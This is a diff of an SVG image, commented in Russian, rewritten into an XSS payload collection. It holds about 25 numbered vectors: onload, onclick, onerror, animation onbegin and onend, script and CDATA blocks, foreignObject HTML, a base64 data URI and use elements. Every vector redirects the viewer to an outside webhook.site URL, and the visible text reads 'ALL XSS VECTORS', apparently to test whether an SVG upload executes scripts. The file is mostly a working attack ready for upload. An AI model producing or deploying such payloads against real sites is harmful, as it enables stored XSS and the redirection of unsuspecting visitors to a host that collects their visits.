@@ -1,14 +1,225 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="window.location.href='https://google.com'">
-  <!-- Красный фон -->
-  <rect width="100%" height="100%" fill="#cc0000"/>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" 
+     onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
   
-  <!-- Скрытый редирект через <a> (дополнительный вектор) -->
-  <a href="javascript:alert('XSS via SVG!')">
+  <!-- ==================== ОСНОВНЫЕ ВЕКТОРЫ ==================== -->
+  
+  <!-- 1. onload - главный вектор -->
+  <rect width="100%" height="100%" fill="#cc0000" 
+        onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 2. onclick - клик по фону -->
+  <rect width="100%" height="100%" fill="#cc0000" opacity="0.3" 
+        onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 3. onmouseover - наведение на фон -->
+  <rect width="100%" height="100%" fill="#cc0000" opacity="0.1" 
+        onmouseover="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- ==================== ССЫЛКИ ==================== -->
+  
+  <!-- 4. Ссылка с javascript: -->
+  <a href="javascript:window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
     <rect width="100%" height="100%" fill="transparent"/>
   </a>
   
-  <!-- Видимый текст в центре -->
-  <text x="50%" y="50%" font-size="3" fill="black" font-family="Arial" text-anchor="middle" dominant-baseline="central">
+  <!-- 5. Ссылка с onclick -->
+  <a href="#" onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
+    <rect width="100%" height="100%" fill="transparent" opacity="0.1"/>
+  </a>
+  
+  <!-- 6. Ссылка с data URI -->
+  <a href="data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbi5ocmVmPSdodHRwczovL3dlYmhvb2suc2l0ZS84ODBhM2MzNC0zOGRiLTQ5ZmMtODI0Yy02ZWU2OGFhZWRkMzcnPC9zY3JpcHQ+">
+    <rect width="100%" height="100%" fill="transparent" opacity="0.05"/>
+  </a>
+  
+  <!-- ==================== ИЗОБРАЖЕНИЯ ==================== -->
+  
+  <!-- 7. Image с onerror -->
+  <image href="x" onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'" 
+         width="100%" height="100%"/>
+  
+  <!-- 8. Image с onload -->
+  <image href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>" 
+         onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+         width="100%" height="100%" opacity="0.1"/>
+  
+  <!-- ==================== АНИМАЦИИ ==================== -->
+  
+  <!-- 9. Animate с onbegin -->
+  <animate attributeName="opacity" values="0;1;0" dur="1s" repeatCount="indefinite"
+           onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 10. Animate с onend -->
+  <animate attributeName="width" values="0;100" dur="1s" fill="freeze"
+           onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 11. AnimateTransform с событиями -->
+  <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s" repeatCount="1"
+                    onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+                    onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 12. AnimateMotion -->
+  <animateMotion path="M0,0 L100,100" dur="2s"
+                 onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+                 onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- ==================== SET (таймер) ==================== -->
+  
+  <!-- 13. Set с onbegin -->
+  <set attributeName="fill" to="green" dur="1s"
+       onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- ==================== SCRIPT ==================== -->
+  
+  <!-- 14. Прямой script -->
+  <script>window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'</script>
+  
+  <!-- 15. Script с CDATA -->
+  <script><![CDATA[
+    window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'
+  ]]></script>
+  
+  <!-- ==================== FOREIGN OBJECT ==================== -->
+  
+  <!-- 16. ForeignObject с HTML -->
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" 
+         onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+         onmouseover="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+         onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
+      <img src="x" onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+      <a href="javascript:window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">XSS</a>
+    </div>
+  </foreignObject>
+  
+  <!-- ==================== USE ==================== -->
+  
+  <!-- 17. Use с href -->
+  <use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='window.location.href=\"https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37\"'/>"
+       onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- ==================== ДОПОЛНИТЕЛЬНЫЕ ВЕКТОРЫ ==================== -->
+  
+  <!-- 18. onfocus с autofocus -->
+  <text x="50%" y="50%" font-size="60" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" 
+        onfocus="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'" 
+        autofocus>
     YANDEX_PLUS_2026
   </text>
+  
+  <!-- 19. onfocusin / onfocusout -->
+  <text x="50%" y="55%" font-size="40" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" 
+        onfocusin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocusout="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        tabindex="0">
+    XSS VECTORS
+  </text>
+  
+  <!-- 20. onactivate -->
+  <text x="50%" y="60%" font-size="30" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" 
+        onactivate="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
+    CHECK ALL
+  </text>
+  
+  <!-- 21. onbegin / onend для всех анимаций -->
+  <circle cx="50%" cy="70%" r="10" fill="white" opacity="0.5">
+    <animate attributeName="r" values="10;20;10" dur="1s" repeatCount="indefinite"
+             onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+             onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  </circle>
+  
+  <!-- 22. Скрытые векторы -->
+  <rect width="0" height="0" 
+        onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <circle cx="0" cy="0" r="0" 
+          onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- 23. onunload -->
+  <text x="50%" y="50%" font-size="0" 
+        onunload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
+    X
+  </text>
+  
+  <!-- 24. onerror -->
+  <image href="invalid" onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+         width="0" height="0"/>
+  
+  <!-- 25. onabort -->
+  <image href="large" onabort="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+         width="0" height="0"/>
+  
+  <!-- ==================== ВСЕ СОБЫТИЯ НА ОДНОМ ЭЛЕМЕНТЕ ==================== -->
+  
+  <rect x="0" y="80%" width="100%" height="20%" fill="red" opacity="0.5"
+        onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmouseover="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmouseout="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmousemove="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocus="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onblur="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocusin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocusout="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onactivate="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onunload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
+  <!-- ==================== ТЕКСТ ==================== -->
+  
+  <text x="50%" y="45%" font-size="80" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" font-weight="bold"
+        onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmouseover="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'">
+    ⚠️ ALL XSS VECTORS ⚠️
+  </text>
+  
+  <text x="50%" y="55%" font-size="30" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" opacity="0.7">
+    Click anywhere to test all vectors
+  </text>
+  
+  <text x="50%" y="60%" font-size="20" fill="white" font-family="Arial" 
+        text-anchor="middle" dominant-baseline="central" opacity="0.5">
+    Check Webhook: 880a3c34-38db-49fc-824c-6ee68aaedd37
+  </text>
+  
+  <!-- ==================== ВСЕ АНИМАЦИИ С СОБЫТИЯМИ ==================== -->
+  
+  <g>
+    <rect x="10%" y="70%" width="20" height="20" fill="white">
+      <animate attributeName="x" values="10%;80%" dur="2s" repeatCount="indefinite"
+               onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+               onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+    </rect>
+  </g>
+  
+  <g>
+    <circle cx="50%" cy="75%" r="15" fill="yellow">
+      <animate attributeName="r" values="5;25;5" dur="1s" repeatCount="indefinite"
+               onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+               onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+    </circle>
+  </g>
+  
+  <!-- ==================== ПОСЛЕДНИЙ ВЕКТОР - ВСЕ АТРИБУТЫ ==================== -->
+  
+  <rect width="0" height="0" 
+        onload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onclick="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmouseover="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocus="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onbegin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onend="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onerror="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onunload="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onabort="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onactivate="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocusin="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onfocusout="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmouseout="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"
+        onmousemove="window.location.href='https://webhook.site/880a3c34-38db-49fc-824c-6ee68aaedd37'"/>
+  
 </svg>
